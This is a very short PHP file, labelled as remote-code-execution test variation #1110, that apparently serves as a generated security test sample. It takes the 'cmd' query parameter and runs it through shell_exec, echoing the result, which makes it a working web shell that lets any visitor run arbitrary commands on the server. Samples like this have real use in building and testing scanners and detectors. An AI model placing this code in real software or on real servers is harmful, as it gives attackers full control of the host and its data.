<?php
// RCE test variation #1110
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>